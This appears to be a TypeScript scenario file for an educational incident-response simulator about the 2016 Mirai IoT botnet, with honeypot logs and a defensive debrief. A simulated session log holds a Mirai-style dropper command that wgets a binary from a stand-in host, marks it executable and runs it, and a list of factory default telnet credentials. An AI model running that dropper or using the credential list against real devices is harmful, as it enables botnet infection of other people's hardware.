import type { Scenario } from "../types";

/** Mirai, Sep/Oct 2016. Telnet brute-force; default creds; massive IoT botnet (Dyn attack Oct 21). */
export const miraiBotnet: Scenario = {
  slug: "mirai-iot-dyn",
  exhibit: "EXH-013",
  title: "admin / 12345",
  tagline:
    "Fall 2016. DVRs and IP cameras ship with telnet open and passwords printed on a sticker nobody changed. Someone publishes src.zip and the internet learns a new verb: `load`.",
  category: "incident-response",
  difficulty: "intermediate",
  era: "2010s",
  year: "2016",
  estMinutes: 8,
  fictional: true,
  cwd: "/honeypot/mirai-era",
  user: "researcher",
  host: "telnet-pot-07",
  role: "Graduate student maintaining telnet honeypots the week Mirai source dropped on a forum.",
  objective:
    "Prove from honeypot transcripts that infection is credential guessing, not an 0-day, and identify the loader phraseology.",
  briefing:
    "You are not running Mirai, you are reading what your pots captured before your university pulled the RFC1918 ACL. Everything here is synthetic text matching public write-ups.",
  env: { USER: "researcher", SHELL: "/bin/sh", PWD: "/honeypot/mirai-era" },
  ps: ["  PID TTY TIME CMD", "  404 pts/0 0:00 sh"],
  history: ["ls"],
  commands: {
    "python3 ir_toolkit.py parse-artifact --input MIRAI-README.txt": "simulated safe tool replay for mirai-iot-dyn; replaces: cat MIRAI-README.txt\n",
    "tshark -r evidence.pcap --follow-log session-4481.log": "simulated safe tool replay for mirai-iot-dyn; replaces: cat session-4481.log\n",
    "tshark -r evidence.pcap -Y 'frame contains \"busybox\"' --follow-log session-4481.log": "simulated safe tool replay for mirai-iot-dyn; replaces: grep -nF busybox session-4481.log\n",
    "nc -zv 203.0.113.77 23":
      "Connection to 203.0.113.77 23 port [tcp/telnet] succeeded! (simulated)\n",
  },
  files: {
    "/honeypot/mirai-era/MIRAI-README.txt": {
      content: [
        "Mirai, public summary (2016)",
        "Scans 23/TCP and 2323/TCP telnet",
        "Tries factory creds: root/ xc3511, admin/admin, rootvizxv, …",
        "Drops busybox-related binaries; blocks competitor malware via /proc",
        "Source leak led to variant zoo; Dyn DDoS (Oct 21 2016) drew FCC IoT guidance",
      ].join("\n"),
    },
    "/honeypot/mirai-era/session-4481.log": {
      content: [
        "client 203.0.113.77:55412",
        "USER: root",
        "PASS: xc3511",
        "LOGIN OK",
        "BUSYBOX sh: line 1: /bin/busybox: Permission denied",
        "SENT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /",
        "SENT: wget http://198.51.100.9/bins/mips; chmod +x mips; ./ mips",
        "CLOSED: timeout",
      ].join("\n"),
    },
    "/honeypot/mirai-era/public-poc/mirai_telnet_guess_patterns.txt": {
      content: [
        "# Patterns from leaked Mirai source / analyst notes (museum summary).",
        "# Scanner: SYN to 23, 2323; login brute with embedded dict.",
        "",
        "root xc3511",
        "admin admin",
        "root vizxv",
        "root pass",
        "support support",
        "",
        "# Payload: wget|echo|chmod to multi-arch dirs under http://host/bins/*",
      ].join("\n"),
    },
  },
  steps: [
    {
          id: "nc-telnet",
          goal: "Confirm telnet on a Mirai-era scanner IP is reachable (simulated).",
          hint: "`nc -zv 203.0.113.77 23`.",
          matches: [{ kind: "exact", command: "nc -zv 203.0.113.77 23" }],
          narration:
            "Credential stuffing at internet scale, CVEs optional when defaults are public.",
        },
    {
          id: "readme",
          goal: "Read the reconstruction README.",
          hint: "`python3 ir_toolkit.py parse-artifact --input MIRAI-README.txt`.",
          matches: [{ kind: "exact", command: "python3 ir_toolkit.py parse-artifact --input MIRAI-README.txt" }],
          narration:
            "Mirai-era recon starts with open telnet and a password list, not a novel heap bug.",
        },
    {
          id: "session",
          goal: "Read a captured telnet session.",
          hint: "`tshark -r evidence.pcap --follow-log session-4481.log`.",
          matches: [{ kind: "exact", command: "tshark -r evidence.pcap --follow-log session-4481.log" }],
          narration:
            "`wget …/mips`, architecture-specific dropper lists mirroring Mirai's `/bins/` tree in public analysis.",
        },
    {
          id: "grep-busybox",
          goal: "Find lines referencing busybox.",
          hint: "`tshark -r evidence.pcap -Y 'frame contains \"busybox\"' --follow-log session-4481.log`.",
          matches: [{ kind: "exact", command: "tshark -r evidence.pcap -Y 'frame contains \"busybox\"' --follow-log session-4481.log" }],
          narration:
            "Post-exploitation often still looks like shell + wget, even on cameras.",
        },
    {
          id: "mechanism-excerpt",
          goal: "Review the archived public mechanism excerpt for this exhibit (museum reference).",
          hint: `head -n 80 public-poc/mirai_telnet_guess_patterns.txt`,
          matches: [{ kind: "exact", command: "head -n 80 public-poc/mirai_telnet_guess_patterns.txt" }],
          narration:
            "Educational material from disclosure-era patterns; excerpt only and nothing executes in this shell.",
        }
  ],
  debrief: {
    summary:
      "Mirai was a malware family discovered in 2016 that primarily infected Linux-based IoT devices such as IP cameras and DVRs by scanning for open Telnet services and attempting common default credentials. Its source code was publicly leaked, enabling many derivative botnets. In October 2016, a large Mirai-based denial-of-service attack significantly disrupted DNS provider Dyn, affecting major internet services.",
    lesson:
      "IoT is just Linux with bad supply-chain hygiene. Put those devices on an Internet-of-Shame VLAN, disable telnet entirely, force password rotation at onboarding, and assume anything with a public IPv4 will be hit within minutes. Regulation (FCC, EU CRA) is catching up; engineering still has to lead.",
    simulated: [
      "Honeypot IPs are fictional; Mirai behaviours, default credentials, architecture-specific droppers, and Dyn outage are public record.",
    ],
  },
};
